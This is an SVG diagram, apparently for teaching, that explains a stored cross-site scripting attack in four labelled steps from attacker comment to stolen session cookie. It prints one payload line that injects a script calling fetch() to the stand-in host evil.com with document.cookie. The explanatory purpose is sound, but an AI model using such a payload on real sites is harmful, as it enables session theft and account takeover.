<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif" style="background:var(--bg)">
  <metadata>
    <type>regular</type>
  </metadata>
  <rect x="40" y="40" width="1200" height="580" rx="6" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="75.2941" y="109.6" font-size="15.1521" fill="var(--text-muted)" font-family="Arial, sans-serif">1. Attacker posts malicious comment:</text>
  <text x="101.7647" y="130.48" font-size="13.8894" fill="var(--danger-accent)" font-family="Arial, sans-serif">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
  <rect x="75.2941" y="150.1999" width="211.7647" height="52.2" rx="6" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="181.1764" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Attacker</text>
  <rect x="410.5882" y="150.1999" width="229.4118" height="52.2" rx="6" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="525.294" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Web Server</text>
  <rect x="763.5293" y="150.1999" width="229.4118" height="52.2" rx="6" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="878.2353" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Database</text>
  <line x1="287.0587" y1="175.72" x2="410.5882" y2="175.72" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <line x1="639.9999" y1="175.72" x2="763.5293" y2="175.72" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="75.2941" y="242.9999" font-size="15.1521" fill="var(--text-muted)" font-family="Arial, sans-serif">2. Victim views the page with the comment</text>
  <line x1="878.2353" y1="202.4" x2="878.2353" y2="271.9999" stroke="var(--primary-border)" stroke-width="1.8823"/>
  <rect x="75.2941" y="271.9999" width="211.7647" height="63.8" rx="6" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="181.1764" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Victim</text>
  <text x="181.1764" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)" font-family="Arial, sans-serif">Browser</text>
  <rect x="410.5882" y="271.9999" width="229.4118" height="63.8" rx="6" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="525.294" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Web Server</text>
  <text x="525.294" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)" font-family="Arial, sans-serif">serves page</text>
  <rect x="763.5293" y="271.9999" width="229.4118" height="63.8" rx="6" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="878.2353" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Database</text>
  <text x="878.2353" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)" font-family="Arial, sans-serif">returns data</text>
  <line x1="410.5882" y1="303.3199" x2="287.0587" y2="303.3199" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <line x1="763.5293" y1="303.3199" x2="639.9999" y2="303.3199" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="75.2941" y="376.3999" font-size="15.1521" fill="var(--text-muted)" font-family="Arial, sans-serif">3. Browser executes the script</text>
  <line x1="181.1764" y1="335.7999" x2="181.1764" y2="399.5999" stroke="var(--danger-border)" stroke-width="1.8823"/>
  <rect x="75.2941" y="399.5999" width="317.6471" height="63.8" rx="6" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="234.1176" y="426.28" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">evil.com</text>
  <text x="234.1176" y="449.48" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)" font-family="Arial, sans-serif">receives session cookie</text>
  <text x="445.8823" y="434.4" font-size="15.1521" fill="var(--danger-accent)" font-family="Arial, sans-serif">4. Cookie sent to attacker</text>
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #c4cdd6;
        --border: #6b7280;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000044;
        --black: #000000;
        --primary-fill: #5a7a9c;
        --primary-border: #3d5a7d;
        --primary-text: #ffffff;
        --primary-accent: #243b59;
        --ok-fill: #7a9a6a;
        --ok-border: #5a7a4d;
        --ok-text: #ffffff;
        --ok-accent: #385030;
        --warn-fill: #c8924a;
        --warn-border: #9c6e2e;
        --warn-text: #ffffff;
        --warn-accent: #5a3f12;
        --danger-fill: #a86058;
        --danger-border: #7d3f38;
        --danger-text: #ffffff;
        --danger-accent: #4a1f1a;
        --info-fill: #7c6a8e;
        --info-border: #574a68;
        --info-text: #ffffff;
        --info-accent: #2f253b;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#7493b3"/>
      <stop offset="100%" stop-color="#3d5a7d"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#c4cdd6"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#94b384"/>
      <stop offset="100%" stop-color="#5a7a4d"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#dba868"/>
      <stop offset="100%" stop-color="#9c6e2e"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#bd7d75"/>
      <stop offset="100%" stop-color="#7d3f38"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9384a5"/>
      <stop offset="100%" stop-color="#574a68"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#00000044"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#3d5a7d"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#5a7a4d"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#9c6e2e"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#7d3f38"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#574a68"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
  </defs>
</svg>
